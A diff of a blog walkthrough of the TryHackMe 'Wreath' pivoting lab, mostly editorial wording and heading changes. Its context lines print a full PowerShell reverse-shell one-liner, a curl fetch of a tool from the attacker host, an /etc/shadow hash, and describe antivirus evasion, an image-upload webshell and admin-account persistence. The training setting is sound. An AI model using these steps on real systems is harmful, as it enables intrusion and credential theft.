@@ -17,7 +17,9 @@ tags:
 
 ![wreath-banner](/assets/images/2021-04-14-08-54-25.png)
 
-Wreath is different to a normal TryHackMe room, instead of a single machine it's a network of three. An initial scan finds only a single Linux webserver accessible to us, which we gain RCE on by exploiting Webmin. We turn a reverse shell in to ssh access as root, then enumerate further to find another server accessible to us. We pivot across to this new server and find it's Windows hosting a vulnerable version of GitStack. We use an exploit to gain a reverse shell, then add a new admin user via Evil-WinRM to gain access to the desktop via RDP. We have a little fun with Empire, and then from this second server we enumerate and find a Windows PC is now accessible to us. This PC is running a development version of the Thomas' own website, and after looking at the source code we find a way to get remote code execution. Abusing the image upload function we gain a reverse shell to the PC. From there we take advantage of an unquoted service path by writing a small C program to spawn a system level shell back to us.
+Wreath is different to a normal TryHackMe room, instead of a single machine it's a network of three. This means there's a lot of content to get through, and so this walk-through is long. Very long. I hope you find it useful, and enjoy this room as much as I did.
+
+An initial scan finds only a single Linux webserver accessible to us, which we gain RCE on by exploiting Webmin. We turn a reverse shell in to SSH access as root, then enumerate further to find another server accessible to us. We pivot across to this new server and find it's Windows hosting a vulnerable version of GitStack. We use an exploit to gain a reverse shell, then add a new admin user via Evil-WinRM to gain access to the desktop over RDP. We have a little fun with Empire, and then from this second server we enumerate and find a Windows PC is now accessible to us. This PC is running a development version of Thomas' own website, and after looking at the source code we find a way to get remote code execution. Abusing the image upload function we gain a reverse shell to the PC. From there we take advantage of an unquoted service path by writing a small C program to spawn a system level shell back to us.
 
  <!--more-->
 This is a guided room so skill levels are not assumed. A basic understanding of the tools and techniques needed to enumerate and exploit applications will help though. Skills learned are many and varied, including diferent techniques on Linux and Windows to gain reverse shells. Exploit developement and using frameworks like Empire are also taught. As is using several popular tools like Evil-WinRM, sshuttle and chisel.
@@ -36,7 +38,7 @@ There's an amazing amount of free content provided by TryHackMe in this room, an
 
 If you need help with any answers then [DarkStar](https://tryhackme.com/p/DarkStar7471) has a playlist [here](https://www.youtube.com/playlist?list=PLsqUCyw0Jf9sMYXly0uuwfKMu34roGNwk) that will show you each and every one of them!
 
-## Webserver Enumeration
+## Webserver - Enumeration
 
 We start as with enumeration using nmap, just as we always do:
 
@@ -106,7 +108,7 @@ You can see there is a [302 Found](https://developer.mozilla.org/en-US/docs/Web/
 
 There's a good room [here](https://tryhackme.com/room/webfundamentals) if you need to brush up on the fundamentals of how the web works. It covers DNS and it's role as a fundamental service of the network.
 
-To be able to resolve that url to an IP we need to add it to our hosts file:
+To be able to resolve that URL to an IP we need to add it to our hosts file:
 
 ```text
 ┌──(root💀kali)-[~/thm/wreath]
@@ -129,7 +131,7 @@ We trust Thomas so let's click the **Accept the Risk and Continue** button to pr
 
 ![wreath-thomas](/assets/images/2021-03-24-21-40-52.png)
 
-At last we get to find out what Thomas looks like! After a look around there's nothing obvious in the website.
+At last we get to find out what Thomas looks like! After a search around there's nothing obvious in the website.
 
 Going back to our earlier scan we see other areas to investigate, like this:
 
@@ -141,7 +143,7 @@ A Google search finds a CVE number easily:
 
 ![wreath-webmin-cve](/assets/images/2021-03-24-21-49-49.png)
 
-## Webserver Exploitation
+## Webserver - Exploitation
 
 From the search we found a number of articles that would help us exploit the webmin server on port 10000, but let's follow the guidance in the room. First we download and install the provided exploit:
 
@@ -226,7 +228,7 @@ sh: no job control in this shell
 sh-4.4#
 ```
 
-First thing I do after gaining a reverse shell is upgrade to a more useable pty one:
+First thing I do after gaining a reverse shell is upgrade to a more useable Python one:
 
 ```text
 sh-4.4# python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -241,7 +243,7 @@ whoami
 root
 ```
 
-Nice, already in as root. Let's check do a little enumeration, first check for hashes:
+Nice, already in as root. Let's do a little enumeration, first check for hashes:
 
 ```text
 [root@prod-serv ]# cat /etc/shadow
@@ -249,7 +251,7 @@ cat /etc/shadow
 root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
 ```
 
-With port 22 open there's a good chance we'll find ssh credentials:
+With port 22 open there's a good chance we'll find SSH credentials:
 
 ```text
 [root@prod-serv .ssh]# cd /root
@@ -291,7 +293,7 @@ Warning: Permanently added '10.200.93.200' (ECDSA) to the list of known hosts.
 [root@prod-serv ~]#
 ```
 
-Looks good, we can now get in any time via ssh as root.
+Looks good, we can now get in any time via SSH as root.
 
 ## Pivoting - FoxyProxy
 
@@ -299,9 +301,9 @@ We'll be making use of FoxyProxy later, so let's get it set up now. Browse to [h
 
 ![wreath-foxy](/assets/images/2021-03-25-16-58-26.png)
 
-## Pivoting - SSH Tunnelling/Port Forwarding
+## Pivoting - SSH Tunnelling
 
-We'll also be making use of tunneling later. A reminder of how to do this with ssh is as follows:
+We'll also be making use of tunneling later. A reminder of how to do this with SSH is as follows:
 
 Forward tunneling uses the -L flag, mostly used to tunnel a single port from local to remote machine. The example given is:
 
@@ -323,7 +325,7 @@ ssh -D 1337 user@172.16.0.5 -fN
 
 ## Git Server - Enumeration
 
-Following the room guidance again let's grab the static nmap binary and pull it over to the prod server where we are already logged in.
+Following the room guidance again let's grab the static nmap binary and pull it over to the prod-serv where we are already logged in.
 
 First grab the binary on Kali:
 
@@ -358,7 +360,7 @@ Start a webserver so we can get to the file:
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-Switch over to the prod server that we've already gained root access to, and pull the file across:
+Switch over to prod-serv where we've already gained root access, and pull the file across:
 
 ```text
 [root@prod-serv tmp]# curl 10.50.94.52/nmap-pencer -o /tmp/nmap-pencer && chmod +x /tmp/nmap-pencer
@@ -575,7 +577,7 @@ Approximate round trip times in milli-seconds:
     Minimum = 0ms, Maximum = 0ms, Average = 0ms
 ```
 
-Above we have pinged the webserver on IP .200 that we already have access to. We can see that is accessible from the GitStack server on IP 150. Let's try and ping our Kali machine:
+Above we have pinged the webserver on IP .200 that we already have access to. We can see that is accessible from the GitStack server on IP .150. Let's try and ping our Kali machine:
 
 ```text
 ┌──(root💀kali)-[~/thm/wreath]
@@ -589,7 +591,7 @@ Ping statistics for 10.50.94.52:
     Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
 ```
 
-So the problem we have here is if we try to connect a reverse shell to our Kali machine from the GitStack server it would have to tunnel back through the intermediate webserver we are connected through. And as we can see traffic is currently blocked by the server in the middle. As we already have ssh access to that server we can look at the firewall, and add an exception to allow traffic back to us.
+So the problem we have here is if we try to connect a reverse shell to our Kali machine from the GitStack server it would have to tunnel back through the intermediate webserver we are connected through. And as we can see traffic is currently blocked by the server in the middle. As we already have SSH access to that server we can look at the firewall, and add an exception to allow traffic back to us.
 
 First let's connect to the webserver using the RSA creds we found earlier:
 
@@ -696,7 +698,7 @@ Now we are all set to use the provided PowerShell reverse shell on Kali, and get
 powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.93.200',15999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-Next we need to url encode it, you could use an online converter like [this](https://www.urlencoder.org/).
+Next we need to URL encode it, you could use an online converter like [this](https://www.urlencoder.org/).
 
 Then we run the command on Kali:
 
@@ -720,6 +722,8 @@ We are connected. So now we have a reverse shell from the Windows GitStack serve
 A basic network diagram looks like this so far:
 
 ![wreath-network-diag3](/assets/images/2021-04-11-17-03-26.png)
+
+## Git Server - Persistence
 
 Next let's add a new admin account that we can use to access the GitStack server, so we don't have to rely on the exploit:
 
@@ -785,6 +789,8 @@ With our admin access created we can logon on to the server desktop using the Ka
 An RDP session will be opened and we can see the desktop, also the folder on Kali is mapped as a share so we can get to the files:
 
 ![gitstack-desktop](/assets/images/2021-04-06-22-27-26.png)
+
+## Git Server - Hashes
 
 Let's use Mimikatz to grab the hashes. First elevate our privileges:
 
@@ -1190,7 +1196,7 @@ VulnStatus : Not Vulnerable
 
 That's enough fun with Empire for now. Time to move on to our final target, the personal PC of our host Thomas.
 
-## Thomas Personal PC
+## Windows PC - Enumeration
 
 With no direct access to the PC, we need to tunnel through the GitStack server. We already have the administrators hash, so we can revisit Evil-WinRM and use it to get a shell:
 
@@ -1291,7 +1297,7 @@ chisel-pencer.exe : 2021/04/08 22:49:07 server: Fingerprint tN/HpNZLHHzarwz1EesZ
 2021/04/08 22:49:07 server: Listening on http://0.0.0.0:15997
 ```
 
-Switch back to Kali and start chisel in client mode to connect it to the server version we just started:
+Switch back to Kali and run chisel in client mode to connect it to the server version we just started:
 
 ```text
 ┌──(root💀kali)-[~/thm/wreath]
@@ -1301,7 +1307,7 @@ Switch back to Kali and start chisel in client mode to connect it to the server 
 2021/04/08 22:51:18 client: Connected (Latency 29.1068ms)
 ```
 
-With the chisel client and server connected we can now reach the PC on IP .100.
+On the client here we've said traffic going to port 9090 on Kali send to 10.200.93.150 on port 15997. This is used to route our local traffic over to the GitStack server. With the chisel client and server connected we can now reach the PC on IP .100.
 
 A basic network diagram looks like this so far:
 
@@ -1566,7 +1572,7 @@ Image Size                      : 628x472
 Megapixels                      : 0.296
 ```
 
-With the file prepared, let's log in to the upload page. We know it's in the reources subfolder from looking at the source code:
+With the file prepared, let's log in to the upload page. We know it's in the resources subfolder from looking at the source code:
 
 ![wreath-resources](/assets/images/2021-04-10-22-45-56.png)
 
@@ -1584,9 +1590,11 @@ After selecting the file I clicked Upload, then I can see my file by browsing to
 
 ![wreath-check](/assets/images/2021-04-10-23-05-08.png)
 
-The picture isn't displayed, instead my PHP code has been executed. We have confirmed that we can run arbitary code by exploiting the image upload function. We're on the home straight now, we just need to get ourselves a reverse shell to this PC.
+The picture isn't displayed, instead my PHP code has been executed. We have confirmed that we can run arbitary code by exploiting the image upload function.
 
-## AV Evasion
+We're on the home straight now, we just need to get ourselves a reverse shell to this PC.
+
+## Windows PC - AV Evasion
 
 Of course nothing is as simple as you'd hope, and for us we need to evade Microsoft Defender running on the PC to be able to get a reverse shell. Let's take the suggested PHP code, [obfuscate](https://www.gaijin.at/en/tools/php-obfuscator) it and make it bash friendly:
 
@@ -1642,7 +1650,7 @@ Image Size                      : 628x472
 Megapixels                      : 0.296
 ```
 
-Finally we can upload the picture in the same way as before, and then let's check our webshell works. We use my parameter to run any command we wat, for example here we do a dir:
+Finally we can upload the picture in the same way as before, and then let's check our webshell works. We use my parameter to run any command we want, for example here we do a dir:
 
 ![wreath-jpeg-test](/assets/images/2021-04-11-22-43-13.png)
 
@@ -1925,7 +1933,7 @@ whoami
 nt authority\system
 ```
 
-## Exfiltration
+## Windwos PC - Exfiltration
 
 We've reached our goal, which was to gain root/system level access to Thomas' PC. All that's left now is to gather some evidence of this to show Thomas we pwned him!
 
